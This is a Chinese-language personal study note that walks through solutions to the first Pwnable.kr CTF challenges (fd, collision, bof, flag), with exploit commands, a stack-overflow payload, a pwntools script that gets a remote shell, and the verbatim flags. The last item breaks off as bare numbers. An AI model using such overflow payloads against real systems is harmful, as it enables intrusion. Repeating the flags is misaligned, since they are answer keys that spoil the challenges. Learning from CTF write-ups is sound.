## Pwn学习笔记

1. Pwnable.kr题目[fd]，阅读代码发现程序运行时传入的参数减去0x1234为read的第一个参数fd，若传入4660则会从标准输入中再读取32个字节到buf，再将buf和'LETMEWIN'比较，正确则输出flag。

   - solution

     ```shell
     ./fd 4660
     LETMEWIN
     ```

   - flag

     - mommy! I think I know what a file descriptor is!!

2. Pwnable.kr题目collision，阅读代码发现程序是通过读取20个bytes，然后将其当作5个整型进行相加，最后的结果和0x21DD09EC进行比较，正确则输出flag。一开始直接输入16个\x00和\xEC\x09\xDD\x21会提示长度不是20 bytes，因为\x09是制表符，会截断输入。因此换成输入16个\x01和\xE8\x05\xD9\x1D即可。

   - solution

     ```shell
     ./col \`python -c "print '\x01' * 16 + '\xE8\x05\xD9\x1D'"\`
     ```

   - tips
     - 小端模式
     - 反引号`（和波浪符～同一个键）可以执行程序，将程序输出作为运行程序的参数

   - flag

     - daddy! I just managed to create a hash collision :)

3. Pwnable.kr题目bof，栈溢出题目，要改变传入参数key，使其变为0xcafebabe。用gdb调试并打印内存，可以知道字符串s和key的地址，如下所示

   0xffffce10:	0x00000009	0xffffd104	0xf7e094a9	0x61616161 <- 字符s起始地址，0xffffce1c
   0xffffce20:	0x61616161	0x61616161	0x61616161	0x61616161
   0xffffce30:	0x61616161	0x61616161	0x61616161	0x968c6b00
   0xffffce40:	0x00000000	0xf7e095db	0xffffce68	0x5655569f
   0xffffce50:	0xdeadbeef	 <-参数key所在地址，0xffffce50

   可知两个变量之间相差52个字节，用python -c "print 'a'*52+'\xbe\xba\xfe\xca'"可以生成输入字符串

   用ida打开程序bof也可以找到字符串s和key之间的相差多少字节

   ![1541557917281](/home/wji/.config/Typora/typora-user-images/1541557917281.png)

   - solution

     ```
     (python -c "print 'a'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
     ls
     cat flag
     ```

     #################################################

     ```
     #!/usr/bin/env python
     # coding=utf-8
     import pwn	
     r=pwn.remote('pwnable.kr',9000)
     r.send('a'*52+pwn.p32(0xcafebabe))
     r.interactive()
     ```

   - tips
     - 将python打印语句用括号括起来放在前面，后面再运行程序就会将python打印的语句作为程序的标准输入中获取的参数
     - 后面加一句cat是为了不让shell一闪而过
     - pwn.p32(0xcafebabe)就可以直接生成16进制输入串，再也不用自己一个个按照小端模式打了
   - flag
     - daddy, I just pwned a buFFer :)

4. Pwnable.kr题目flag，直接用ida打开发现没有main函数，有很多跳转，根据提示“a packed present“，猜想可能是加壳程序，利用查壳工具exeinfo查看程序，发现加了upx壳，利用`upx -d flag`可以进行脱壳。用ida打开脱壳之后的程序，查看main函数，很容易发现flag，双击flag变量直接用ida就能查看。
   - flag
     - UPX...? sounds like a delivery service :)
5. Pwnable.kr题目passcode  338150 13371337